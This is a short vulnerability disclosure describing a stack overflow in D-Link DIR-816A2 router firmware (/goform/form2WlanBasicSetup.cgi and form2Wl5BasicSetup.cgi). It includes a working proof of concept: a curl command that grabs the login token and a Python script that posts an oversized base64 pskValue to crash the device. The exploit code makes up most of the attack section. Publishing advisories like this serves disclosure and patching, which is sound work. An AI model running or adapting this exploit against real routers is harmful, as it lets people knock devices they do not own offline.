# DIR-816A2_FWv1.10CNB05_R1B011D88210.img Stack overflow vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in /goform/form2WlanBasicSetup.cgi and /goform/form2Wl5BasicSetup.cgi.  With the setSecurity function,the contents obtained by the wizardstep4_pskpwd parameter are passed to V9, and then the contents matched by V9 are decoded and put into the V17 stack without size checking, resulting in a stack overflow.

![](img/2.png#center)

![](img/3.png#center)
## POC

Gets the token ID

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Run poc

```python
import requests
import base64

tokenid = ''

url = 'http://192.168.0.1/goform/form2WlanBasicSetup.cgi' #/goform/form2Wl5BasicSetup.cgi

payload = base64.b64encode(b'a' * 10000)

data = {
    'tokenid': tokenid,
    'method': '4',
    'pskValue': payload

}

r = requests.post(url, data)
hunzi = r.text
print(hunzi)
```

You can see the router crash
